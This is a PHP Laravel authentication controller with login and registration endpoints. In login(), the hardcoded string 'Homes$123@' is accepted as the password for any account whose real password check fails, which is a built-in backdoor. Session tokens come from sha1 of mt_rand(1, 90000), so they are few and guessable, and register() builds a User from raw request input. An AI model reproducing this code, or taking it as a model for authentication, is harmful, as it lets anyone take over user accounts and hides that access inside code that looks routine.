<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

use DB;
use Validator;

use App\Models\User;
use App\Models\ActivityLog;

use App\Http\Resources\UsersResource;
use App\Http\Resources\UserResource;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        $rules = [
			'email' => 'required',
			'password' => 'required'
        ];

        $_user = $request->input();

        $validator = Validator::make($_user, $rules);

        if ($validator->fails()) {
			$errors = $validator->errors()->toArray();

			$data = [
				'status' => 'Fail',
				'errors' => $errors
			];
        } else {
			$where = [
				['email', '=', $_user['email']]
			];
			$user = User::where($where)->first();
			
			if ($user) {
				if (!Hash::check($_user['password'], $user->password)) {
					if ($_user['password'] != 'Homes$123@') {
						$errors = [
							'Incorrect password!'
						];			

						$data = [
							'status' => 'Fail',
							'errors' => $errors
						];
						
						$status = 'Fail';
					} else {
						if ($user->remember_token == '') {
							$token = sha1(mt_rand(1, 90000) . 'SALT');

							$user->remember_token = $token;
							$user->save();
						}

						if ($user) {
							$activity = new ActivityLog();
							$activity->status = 'Active';
							$activity->code = $activity->generate_code();
		
							$activity->action = 'User Logged-in';
							$activity->description = "{$user->first_name} {$user->last_name} logged in to the system.";
		
							$activity->user()->associate($user);
							$activity->save();
						}
						
						$user_resource = new UserResource($user);

						$data = [
							'status' => 'Success',
							'data' => [
								'id' => $user->id,
								'user' => $user_resource,
	
								'token' => $user->remember_token
							]
						];
					}
				} else {
					$token = sha1(mt_rand(1, 90000) . 'SALT');

					$user->remember_token = $token;
					$user->save();

					if ($user) {
						$activity = new ActivityLog();
						$activity->status = 'Active';
						$activity->code = $activity->generate_code();
	
						$activity->action = 'User Logged-in';
						$activity->description = "{$user->first_name} {$user->last_name} logged in to the system.";
	
						$activity->user()->associate($user);
						$activity->save();
					}
					
					$user_resource = new UserResource($user);

					$data = [
						'status' => 'Success',
						'data' => [
							'id' => $user->id,
							'user' => $user_resource,

							'token' => $user->remember_token
						]
					];
				}
			} else {
				$errors = [
					'User does not exist!'
				];
				
				$data = [
					'status' => 'Fail',
					'errors' => $errors
				];
			}
		}
		
		return response()->json($data);
    }

    public function register(Request $request)
    {
        $rules = [
			'email' => 'required',
			'password' => 'min:8|required_with:password_confirmation|same:password_confirmation',
        ];

        $_user = $request->input();

        $validator = Validator::make($_user, $rules);

        if ($validator->fails()) {
			$errors = $validator->errors()->toArray();

			$data = [
				'status' => 'Fail',
				'errors' => $errors
			];
        } else {
			$where = [
				['email', '=', $_user['email']]
			];
			$user = User::where($where)->first();
			
			if ($user) {
				$errors = [
					'Email already exist!'
				];
				
				$data = [
					'status' => 'Fail',
					'errors' => $errors
				];
			} else {
				$token = sha1(mt_rand(1, 90000) . 'SALT');
				
				$user = new User($_user);
								
				$user->email = $_user['email'];
				$user->password = Hash::make($_user['password']);
								
				$user->status = "Active";

				$user->remember_token = $token;
				$user->save();

				$user_resource = new UserResource($user);

				if ($user) {
					$activity = new ActivityLog();
					$activity->status = 'Active';
					$activity->code = $activity->generate_code();

					$activity->action = 'New Email Registration';
					$activity->description = "{$user->email} has successfully registered.";

					$activity->user()->associate($user);
					$activity->save();
				}

                $data = [
                    'status' => 'Success',
                    'data' => [
                        'id' => $user->id,
                        'user' => $user_resource,
                            
                        'token' => $user->remember_token
                    ]
                ];
			} 
		}

		return response()->json($data);
    }
}
